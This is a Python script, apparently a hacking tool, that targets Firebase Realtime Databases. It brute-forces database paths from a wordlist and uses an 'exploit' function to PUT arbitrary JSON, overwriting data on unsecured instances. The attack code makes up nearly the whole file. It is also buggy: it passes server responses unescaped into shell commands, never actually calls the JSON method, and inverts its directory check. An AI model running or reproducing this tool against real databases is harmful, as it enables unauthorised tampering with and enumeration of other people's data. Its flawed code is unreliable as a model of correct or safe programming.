#!/usr/bin/env python3

"""
Developed by Gh0st666
"""

try:
	import os
	import sys
	import argparse
	import requests
	import time
	import urllib3
	import os.path
except ImportError:
	os.system("clear")
	echo("[ Error ] > Failed to import library", red, bold)



# Character
normal       = "\e[0m"
bold         = "\e[1m"
underline    = "\e[4m"
blinking     = "\e[5m"
reverseVideo = "\e[7m"

# Foreground Color
black  = "\e[30m"
red    = "\e[31m"
green  = "\e[32m"
brown  = "\e[33m"
blue   = "\e[34m"
purple = "\e[35m"
cyan   = "\e[36m"
lgray  = "\e[37m"

# Background Color
blackBg  = "\e[40m"
redBg    = "\e[41m"
greenBg  = "\e[42m"
brownBg  = "\e[43m"
blueBg   = "\e[44m"
purpleBg = "\e[45m"
cyanBg   = "\e[46m"
lgrayBg  = "\e[47m"



# For style purposes
def echo(str, col, cha):
	os.system("echo -e '{}{}{}\e[0m'".format(col,cha,str))



def checkInternet(timeout):
	try:
		network = requests.head("https://google.com/", timeout=timeout)
		return True
	except requests.ConnectionError:
		return False
	


def postExploit(url,data):
	req    = requests.put(url,data=data)
	result = req.status_code
	text   = req.json
	if result   == 200:
		os.system("clear")
		echo(text, green, bold)
		echo("OK!", green, bold)
	elif result == 400:
		os.system("clear")
		echo(text, red, bold)
		echo("Bad Request!", red, bold)
	elif result == 404:
		os.system("clear")
		echo(text, red, bold)
		echo("Not Found!", red, bold)
	elif result == 401:
		os.system("clear")
		echo(text, blue, bold)
		echo("Permission Denied!", blue, bold)



# Main function
def main():
	"""
	Usage: python3 pyfirebase.py [-Option] [Argument]
	-h --help    For showing this help list
	-u --url     Firebase URL
	-b --brute   Bruteforce URL path
	-p --post    POST data
	"""
	parser  = argparse.ArgumentParser()
	parser.add_argument("-u", "--url", help="Firebase URL", required=True, dest="url")
	parser.add_argument("-b", "--brute", dest="txt_file")
	parser.add_argument("-p", "--post", help="Post data to target", dest="payload")
	args    = parser.parse_args()
	
	URL     = args.url
	txtFile = args.txt_file
	payload = args.payload
	
	if checkInternet(1) == True:
		if not URL.startswith("https"):
			echo("URL format must be in https!", red, bold)
			time.sleep(3)
			os.system("clear && python3 pyfirebase.py -h")
		elif not URL.__contains__("firebaseio.com"):
			echo("URL format must contain firebaseio.com", red, bold)
			time.sleep(3)
			os.system("clear && python3 pyfirebase.py -h")
		
		if payload == None:
			pass
		else:
			if payload.startswith("{") and payload.endswith("}"):
				postExploit(URL, payload)
			else:
				os.system("clear")
				echo("Wrong data format!\nExample: {'data':'test'}", red, bold)
		
		if txtFile == None:
			pass
		else:
			userAgent = {"User-Agent":"Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36"}
			try:
				if txtFile.__contains__("/"):
					isDir = os.path.isdir(txtFile)
					if isDir:
						getLastPath = os.path.split(txtFile)
						fileTxt     = getLastPath[1]
						os.system("clear")
						ori         = requests.get(URL)
						echo("Try: {} =>".format(URL) + str(ori.status_code) + "\n", green, bold)
						with open(fileTxt, 'r') as file:
							for data in file:
								URL  = URL.replace(".json", "")
								url  = URL + data + ".json"
								http = requests.get(url.strip())
								echo("Try: {} =>".format(url) + str(http.status_code) + "\n", green, bold)
							file.close()
					else:
						echo("This is not a file!", red, bold)
				else:
					os.system("clear")
					ori = requests.get(URL)
					echo("Try: {} =>".format(URL) + str(ori.status_code) + "\n", green, bold)
					with open(txtFile, 'r') as file:
						for data in file:
							URL  = URL.replace(".json", "")
							url  = URL + data + ".json"
							http = requests.get(url.strip())
							echo("Try: {} =>".format(url) + str(http.status_code) + "\n", green, bold)
						file.close()
			except KeyboardInterrupt: # Ctrl+C to stop this
				echo("\nBruteforce Stoped...", blue, bold)
	else:
		os.system("clear")
		echo("No Internet!", red, bold)



# Run the main() script
if __name__ == '__main__':
	main()
